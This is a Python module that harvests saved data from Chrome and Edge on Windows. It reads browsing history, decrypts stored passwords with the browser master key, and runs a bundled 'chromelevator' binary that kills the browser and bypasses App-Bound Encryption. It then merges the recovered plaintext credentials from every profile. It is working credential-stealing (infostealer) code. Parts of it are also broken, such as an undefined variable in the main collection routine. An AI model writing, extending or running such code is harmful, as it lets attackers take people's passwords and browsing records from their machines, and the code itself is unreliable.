import os
import sqlite3
import shutil
import tempfile
import logging
from .decryptor import BrowserDecryptor

logger = logging.getLogger(__name__)

class BrowserExtractor:
    """Extracts data from Chromium-based browsers."""
    
    CHROME_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    EDGE_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data")
    
    def __init__(self):
        self.decryptor = BrowserDecryptor()

    def get_profiles(self, base_path):
        """Finds browser profiles in a given base path."""
        if not os.path.exists(base_path):
            return []
            
        profiles = ["Default"]
        # Look for Profile 1, Profile 2, etc.
        for item in os.listdir(base_path):
            if item.startswith("Profile "):
                profiles.append(item)
        return profiles

    def extract_history(self, db_path, browser_type, limit=100):
        """Extracts browsing history from History SQLite DB."""
        if not os.path.exists(db_path):
            return []
            
        results = []
        temp_db = os.path.join(tempfile.gettempdir(), f"history_{browser_type.replace(' ', '_').replace('(', '').replace(')', '')}_{os.urandom(4).hex()}")
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            conn.text_factory = bytes
            cursor = conn.cursor()
            
            cursor.execute(f"""
                SELECT url, title, visit_count, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT {limit}
            """)
            
            for row in cursor.fetchall():
                url = row[0].decode('utf-8', errors='replace') if isinstance(row[0], bytes) else row[0]
                title = row[1].decode('utf-8', errors='replace') if isinstance(row[1], bytes) else row[1]
                
                last_visit = self.decryptor.chrome_date_to_datetime(row[3])
                results.append({
                    "url": url,
                    "title": title,
                    "visit_count": row[2],
                    "last_visit_time": last_visit.isoformat() if last_visit else None,
                    "browser_type": browser_type
                })
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"[Extractor] Error extracting history from {db_path}: {e}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
                
        return results

    def extract_credentials(self, db_path, local_state_path, browser_type):
        """Extracts and decrypts saved passwords from Login Data SQLite DB."""
        if not os.path.exists(db_path) or not os.path.exists(local_state_path):
            return []
            
        master_key = self.decryptor.get_master_key(local_state_path)
        if not master_key:
            return []
            
        results = []
        temp_db = os.path.join(tempfile.gettempdir(), f"logins_{browser_type.replace(' ', '_').replace('(', '').replace(')', '')}_{os.urandom(4).hex()}")
        
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            conn.text_factory = bytes
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, action_url, username_element, username_value, 
                       password_element, password_value, date_created 
                FROM logins
            """)
            
            for row in cursor.fetchall():
                password = self.decryptor.decrypt_payload(row[5], master_key)
                if isinstance(password, bytes):
                    password = password.decode('utf-8', errors='replace')
                
                # Decode other fields if they are bytes
                origin_url = row[0].decode('utf-8', errors='replace') if isinstance(row[0], bytes) else row[0]
                action_url = row[1].decode('utf-8', errors='replace') if isinstance(row[1], bytes) else row[1]
                username_val = row[3].decode('utf-8', errors='replace') if isinstance(row[3], bytes) else row[3]
                
                created_at = self.decryptor.chrome_date_to_datetime(row[6])
                
                results.append({
                    "origin_url": origin_url,
                    "action_url": action_url,
                    "username_element": row[2].decode('utf-8', errors='replace') if isinstance(row[2], bytes) else row[2],
                    "username_value": username_val,
                    "password_element": row[4].decode('utf-8', errors='replace') if isinstance(row[4], bytes) else row[4],
                    "password_value": str(password),
                    "browser_type": browser_type,
                    "created_at_browser": created_at.isoformat() if created_at else None
                })
            
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"[Extractor] Error extracting credentials from {db_path}: {e}")
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
                
        return results

    # Removed extract_cookies as requested

    def run_elevation_pass(self, browser_name):
        """Runs ChromElevator to bypass ABE for a specific browser."""
        # Use absolute path to the binary in modules/browser/bin/
        base_dir = os.path.dirname(os.path.abspath(__file__))
        bin_path = os.path.normpath(os.path.join(base_dir, "bin", "chromelevator.exe"))
        
        if not os.path.exists(bin_path):
            logger.warning(f"ChromElevator binary not found at {bin_path}")
            return None
            
        temp_out = os.path.normpath(os.path.join(tempfile.gettempdir(), f"abe_{browser_name.lower()}_{os.urandom(4).hex()}"))
        os.makedirs(temp_out, exist_ok=True)
        
        try:
            import subprocess
            cmd = [f'"{bin_path}"', "--browser", browser_name.lower(), "-o", f'"{temp_out}"', "--kill"]
            cmd_str = " ".join(cmd)
            logger.info(f"Running elevation pass: {cmd_str}")
            
            # Use shell=True for better Windows support with quoted paths
            subprocess.run(cmd_str, shell=True, capture_output=True, timeout=90)
            return temp_out
        except Exception as e:
            logger.error(f"Elevation pass failed for {browser_name}: {e}")
            if os.path.exists(temp_out):
                shutil.rmtree(temp_out, ignore_errors=True)
            return None

    def parse_elevation_results(self, output_dir, browser_name):
        """Parses JSON output from ChromElevator."""
        extracted = {"credentials": [], "cookies": []}
        if not output_dir or not os.path.exists(output_dir):
            return extracted
            
        try:
            import json
            # Browser folder name in output usually matches capitalized browser name (Edge, Chrome)
            browser_dir_name = browser_name.capitalize()
            browser_dir = os.path.join(output_dir, browser_dir_name)
            
            logger.info(f"Checking elevation output dir: {browser_dir}")
            if not os.path.exists(browser_dir):
                logger.warning(f"Elevation output dir for {browser_name} not found in {output_dir}. Content: {os.listdir(output_dir)}")
                return extracted
                
            for profile in os.listdir(browser_dir):
                profile_path = os.path.join(browser_dir, profile)
                if not os.path.isdir(profile_path):
                    continue
                    
                browser_label = f"{browser_name} ({profile})"
                logger.info(f"Parsing elevation results for {browser_label}")
                
                # Parse Passwords
                pw_file = os.path.join(profile_path, "passwords.json")
                if os.path.exists(pw_file):
                    with open(pw_file, 'r', encoding='utf-8', errors='replace') as f:
                        data = json.load(f)
                        logger.info(f"Found {len(data)} passwords in elevation results")
                        for item in data:
                            extracted["credentials"].append({
                                "origin_url": item.get("url", ""),
                                "username_value": item.get("user", ""),
                                "password_value": item.get("pass", ""),
                                "browser_type": browser_label,
                                "is_elevated": True # Marker for merging
                            })
                            
                # Removed Cookie parsing as requested
        except Exception as e:
            logger.error(f"Error parsing elevation results: {e}")
            
        return extracted

    def collect_all(self):
        """Collects data from all supported browsers and profiles, with ABE bypass."""
        all_data = {
            "history": [],
            "credentials": []
        }
        
        browsers = [
            ("Chrome", self.CHROME_PATH),
            ("Edge", self.EDGE_PATH)
        ]
        
        # 1. Standard Extraction (DPAPI/GCM)
        for name, base_path in browsers:
            if not os.path.exists(base_path):
                continue
                
            local_state = os.path.join(base_path, "Local State")
            profiles = self.get_profiles(base_path)
            
            for profile in profiles:
                profile_path = os.path.join(base_path, profile)
                history_db = os.path.join(profile_path, "History")
                login_db = os.path.join(profile_path, "Login Data")
                cookie_db = os.path.join(profile_path, "Cookies")
                if not os.path.exists(cookie_db):
                    cookie_db = os.path.join(profile_path, "Network", "Cookies")
                
                all_data["history"].extend(self.extract_history(history_db, browser_label))
                all_data["credentials"].extend(self.extract_credentials(login_db, local_state, browser_label))

        # 2. Elevation Pass (ABE Bypass for v20)
        import shutil
        for name, _ in browsers:
            abe_dir = self.run_elevation_pass(name)
            if abe_dir:
                elevated_data = self.parse_elevation_results(abe_dir, name)
                
                # Merge Credentials: Use a dict for O(1) matching
                # Key: (origin_url, username_value, browser_type)
                s_cred_map = { (c["origin_url"], c["username_value"], c["browser_type"]): c for c in all_data["credentials"] }
                merged_creds = 0
                for e_cred in elevated_data["credentials"]:
                    key = (e_cred["origin_url"], e_cred["username_value"], e_cred["browser_type"])
                    if key in s_cred_map:
                        s_cred_map[key]["password_value"] = e_cred["password_value"]
                        merged_creds += 1
                    else:
                        all_data["credentials"].append(e_cred)
                logger.info(f"Merged {merged_creds} elevated credentials for {name}")
                
                # Removed Cookie merging as requested
                
                # Clean up temporary plaintext files
                shutil.rmtree(abe_dir, ignore_errors=True)
                
        return all_data
